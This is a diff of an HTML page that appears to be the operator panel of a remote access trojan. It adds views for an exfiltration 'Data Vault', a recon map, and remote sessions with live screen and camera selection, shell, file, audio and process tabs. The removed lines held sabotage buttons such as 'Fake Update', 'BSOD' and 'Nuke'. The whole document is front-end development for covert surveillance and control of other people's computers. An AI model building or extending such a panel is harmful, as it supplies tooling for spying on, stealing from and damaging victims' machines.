@@ -13,7 +13,7 @@
 <body oncontextmenu="return false;">
     <canvas id="neuralCanvas" style="position:fixed;inset:0;pointer-events:none;z-index:0;opacity:0.2"></canvas>
 
-    <div class="app-container">
+    <div class="app-container" id="appContainer">
         <!-- 1. Sidebar Navigation -->
         <aside class="sidebar">
             <a href="/" class="brand">
@@ -102,89 +102,107 @@
 
         <!-- 3. Main Area -->
         <main class="main-area">
-            <div id="view-overview" class="fade-in">
-                <div class="node-grid" id="nodeGrid">
-                    <!-- Nodes rendered via script.js -->
-                </div>
-            </div>
+            <div class="workspace-wrapper">
+                                <!-- VIEW 1: Dashboard Workspace -->
+                <div class="workspace-dashboard">
+                    <!-- Dashboard Home (Nodes) -->
+                    <div id="view-overview" class="fade-in">
+                        <div class="node-grid" id="nodeGrid">
+                            <!-- Nodes rendered via script.js -->
+                        </div>
+                    </div>
 
-            <!-- Remote Session View (Hidden by default) -->
-            <div id="view-remote" class="fade-in" style="display:none">
-                <div class="quick-actions">
-                    <button class="action-btn" onclick="toggleHidMode()">
-                        <svg viewBox="0 0 24 24" width="14" height="14" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="3"/><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/></svg>
-                        Watch Only
-                    </button>
-                    <button class="action-btn" onclick="openFileExplorer(currentTargetId, 'C:\\')">
-                        <svg viewBox="0 0 24 24" width="14" height="14" fill="none" stroke="currentColor" stroke-width="2"><path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"/></svg>
-                        Files
-                    </button>
-                    <button class="action-btn" onclick="openShell()">
-                        <svg viewBox="0 0 24 24" width="14" height="14" fill="none" stroke="currentColor" stroke-width="2"><polyline points="4 17 10 11 4 5"/><line x1="12" y1="19" x2="20" y2="19"/></svg>
-                        Shell
-                    </button>
-                </div>
+                    <div id="view-nodes" class="fade-in" style="display:none">
+                        <div class="node-grid" id="nodeGridNodes"></div>
+                    </div>
 
-                <div class="tab-container">
-                    <div class="tab active" onclick="switchRemoteTab('screen')">Screen</div>
-                    <div class="tab" onclick="switchRemoteTab('audio')">Audio</div>
-                    <div class="tab" onclick="switchRemoteTab('files')">Files</div>
-                    <div class="tab" onclick="switchRemoteTab('processes')">Processes</div>
-                    <div class="tab" onclick="switchRemoteTab('tools')">Fun Tools</div>
+                    <!-- File Manager View -->
+                    <div id="view-vault" class="fade-in" style="display:none">
+                        <div style="padding:2rem; background:var(--surface); border-radius:16px; border:1px solid var(--border)">
+                            <h3 style="margin-bottom:1rem; font-family: 'Space Grotesk'">Centralized Data Vault</h3>
+                            <div style="color:var(--text-2)">Encrypted exfiltration and neural backups.</div>
+                        </div>
+                    </div>
+
+                    <!-- Recon View -->
+                    <div id="view-map" class="fade-in" style="display:none">
+                        <div id="map" style="height:600px; border-radius:16px; border:1px solid var(--border); background:#000"></div>
+                    </div>
+                </div>
                 </div>
 
-                                <div id="remoteContent">
-                    <div id="remote-screen" class="tab-content">
-                        <div id="remoteScreenArea">
+                <!-- VIEW 2: Remote Session Workspace -->
+                <div class="workspace-remote" id="view-remote">
+                    <div class="remote-header">
+                        <button class="btn-back" onclick="closeRemote()">
+                            <svg viewBox="0 0 24 24" width="16" height="16" fill="none" stroke="currentColor" stroke-width="2.5"><polyline points="15 18 9 12 15 6"/></svg>
+                            Back
+                        </button>
+                        <div class="remote-node-info">
+                            <span class="remote-node-name" id="remoteNodeLabel">Node ID</span>
+                            <span class="badge badge-teal">● LIVE</span>
+                        </div>
+                        <div class="remote-session-stats">
+                            <div class="session-stat">
+                                <span class="session-stat-label">Performance</span>
+                                <span class="session-stat-value" id="remoteFps">0 FPS</span>
+                            </div>
+                            <div class="session-stat">
+                                <span class="session-stat-label">Latency</span>
+                                <span class="session-stat-value" id="remoteLatency">-- ms</span>
+                            </div>
+                            <div class="session-stat">
+                                <span class="session-stat-label">Resolution</span>
+                                <span class="session-stat-value">1920x1080</span>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="remote-body">
+                        <div class="remote-screen-container">
                             <canvas id="desktopView" style="position:absolute;inset:0;width:100%;height:100%;object-fit:contain;z-index:100"></canvas>
-                            <div class="remote-hud">
-                                <div class="remote-hud-chip"><span class="hud-label">FPS</span><span class="hud-value" id="remoteFps">0</span></div>
-                                <div class="remote-hud-chip"><span class="hud-label">Ping</span><span class="hud-value" id="remoteLatency">--</span></div>
-                                <div class="remote-hud-chip">
-                                    <span class="hud-label">Target</span>
-                                    <select id="fpsSelect" onchange="setStreamFps(this.value)" style="background:transparent;border:none;color:var(--accent);font-size:0.7rem;font-weight:700;outline:none;cursor:pointer">
-                                        <option value="10">10 FPS</option>
-                                        <option value="20">20 FPS</option>
-                                        <option value="30" selected>30 FPS</option>
-                                        <option value="60">60 FPS</option>
-                                    </select>
+                            
+                            <!-- Focused Session HUD -->
+                            <div style="position:absolute; top:1rem; right:1rem; z-index:1000; pointer-events:none">
+                                <div style="background:rgba(10,12,18,0.7); backdrop-filter:blur(20px); border:1px solid rgba(255,255,255,0.1); border-radius:12px; padding:0.75rem; display:flex; flex-direction:column; gap:8px; pointer-events:auto">
+                                    <div style="display:flex; align-items:center; gap:10px">
+                                        <span style="font-size:0.6rem; font-weight:800; color:var(--text-3); text-transform:uppercase">Display</span>
+                                        <select id="monSelect" onchange="setMonitor(this.value)" style="background:transparent; border:none; color:var(--accent); font-size:0.75rem; font-weight:700; outline:none; cursor:pointer">
+                                            <option value="0">Screen 1</option>
+                                        </select>
+                                    </div>
+                                    <div style="display:flex; align-items:center; gap:10px">
+                                        <span style="font-size:0.6rem; font-weight:800; color:var(--text-3); text-transform:uppercase">Target FPS</span>
+                                        <select id="fpsSelect" onchange="setStreamFps(this.value)" style="background:transparent; border:none; color:var(--accent); font-size:0.75rem; font-weight:700; outline:none; cursor:pointer">
+                                            <option value="10">10 FPS</option>
+                                            <option value="20">20 FPS</option>
+                                            <option value="30" selected>30 FPS</option>
+                                            <option value="60">60 FPS</option>
+                                        </select>
+                                    </div>
+                                    <div style="display:flex; align-items:center; gap:10px">
+                                        <span style="font-size:0.6rem; font-weight:800; color:var(--text-3); text-transform:uppercase">Camera</span>
+                                        <select id="camSelect" onchange="setCamera(this.value)" style="background:transparent; border:none; color:var(--accent); font-size:0.75rem; font-weight:700; outline:none; cursor:pointer">
+                                            <option value="-1">Cam Off</option>
+                                        </select>
+                                    </div>
                                 </div>
                             </div>
                         </div>
-                    </div>
-                    <div id="remote-audio" class="tab-content" style="display:none">
-                        <div style="padding:4rem; text-align:center; color:var(--text-3)">Audio Monitoring module active...</div>
-                    </div>
-                    <div id="remote-files" class="tab-content" style="display:none">
-                        <div style="padding:4rem; text-align:center; color:var(--text-3)">File Manager loading...</div>
-                    </div>
-                    <div id="remote-processes" class="tab-content" style="display:none">
-                        <div style="padding:4rem; text-align:center; color:var(--text-3)">Process Intelligence scanning...</div>
-                    </div>
-                    <div id="remote-tools" class="tab-content" style="display:none">
-                        <div class="collapsible">
-                            <div class="collapsible-header">🎭 Visual Trolls</div>
-                            <div class="collapsible-content">
-                                <button class="action-btn" onclick="execTroll(''glitch'')">Screen Glitch</button>
-                                <button class="action-btn" onclick="execTroll(''update'')">Fake Update</button>
-                            </div>
-                        </div>
-                        <div class="collapsible">
-                            <div class="collapsible-header">🔊 Audio Trolls</div>
-                            <div class="collapsible-content">
-                                <button class="action-btn" onclick="execTroll(''tts'')">TTS Message</button>
-                                <button class="action-btn" onclick="execTroll(''sound_loop'')">Loop Sound</button>
-                            </div>
-                        </div>
-                        <div class="collapsible">
-                            <div class="collapsible-header" style="color:var(--red)">💀 Dangerous</div>
-                            <div class="collapsible-content">
-                                <button class="action-btn danger" style="color:var(--red)" onclick="execTroll(''bsod'')">BSOD</button>
-                                <button class="action-btn danger" style="color:var(--red)" onclick="execTroll(''nuke'')">Nuke</button>
+
+                        <div class="remote-footer">
+                            <div class="remote-tabs">
+                                <div class="remote-tab active" onclick="switchRemoteTab('screen')">Screen</div>
+                                <div class="remote-tab" onclick="switchRemoteTab('audio')">Audio</div>
+                                <div class="remote-tab" onclick="switchRemoteTab('files')">Files</div>
+                                <div class="remote-tab" onclick="switchRemoteTab('shell')">Shell</div>
+                                <div class="remote-tab" onclick="switchRemoteTab('procs')">Processes</div>
+                                <div class="remote-tab" onclick="switchRemoteTab('tools')">Tools</div>
                             </div>
                         </div>
                     </div>
                 </div>
+            </div>
         </main>
 
         <!-- 4. Telemetry Console -->
